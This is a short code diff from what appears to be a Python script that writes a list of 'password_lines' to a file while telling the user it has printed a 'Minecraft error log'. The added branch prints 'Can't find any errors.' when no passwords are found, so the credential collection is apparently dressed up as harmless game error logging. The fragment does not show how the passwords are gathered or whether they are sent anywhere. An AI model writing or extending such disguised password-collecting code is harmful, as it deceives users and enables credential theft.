@@ -10,4 +10,7 @@ with open(file_path, "a") as file:
     for line in password_lines:
         file.write(line + "\n")
 
-print("Minecraft error log printed.")
+if not password_lines:
+    print("Can't find any errors.")
+else:
+    print("Minecraft error log printed.")
